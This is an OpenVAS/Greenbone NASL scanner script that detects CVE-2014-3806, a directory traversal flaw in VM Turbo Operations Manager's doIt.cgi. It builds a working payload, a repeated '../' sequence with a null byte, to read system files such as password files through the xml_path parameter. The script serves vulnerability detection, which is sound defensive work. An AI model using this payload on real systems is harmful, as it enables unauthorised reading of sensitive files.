if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804448" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2014-3806" );
	script_bugtraq_id( 67292 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-05-09 14:42:04 +0530 (Fri, 09 May 2014)" );
	script_name( "VM Turbo Operations Manager Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Turbo Operations Manager and is prone to directory
  traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check whether it is able read the system
  files to execute or not." );
	script_tag( name: "insight", value: "Input passed to the 'xml_path' parameter in '/cgi-bin/help/doIt.cgi' is not
  properly sanitised before being used to get the contents of a resource." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "VM Turbo Operations Manager 4.5.x and earlier" );
	script_tag( name: "solution", value: "Upgrade to VM Turbo Operations Manager 4.6 or later." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/532061" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/vm-turbo-operations-manager-45x-directory-traversal" );
	script_xref( name: "URL", value: "https://support.vmturbo.com/hc/en-us/articles/203170127-VMTurbo-Operations-Manager-v4-6-Announcement" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://go.vmturbo.com/cloud-edition-download.html" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
vmtPort = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", "/VMTurbo", "/manager", "/operation-manager", http_cgi_dirs( port: vmtPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	vmtReq = http_get( item: NASLString( dir, "/help/index.html" ), port: vmtPort );
	vmtRes = http_keepalive_send_recv( port: vmtPort, data: vmtReq );
	if(ContainsString( vmtRes, ">VMTurbo Operations Manager" )){
		files = traversal_files();
		for file in keys( files ) {
			url = dir + "/help/doIt.cgi?FUNC=load_xml_file&amp;xml_path=" + crap( data: "../", length: 3 * 15 ) + files[file] + "%00";
			if(http_vuln_check( port: vmtPort, url: url, check_header: TRUE, pattern: file )){
				security_message( port: vmtPort );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

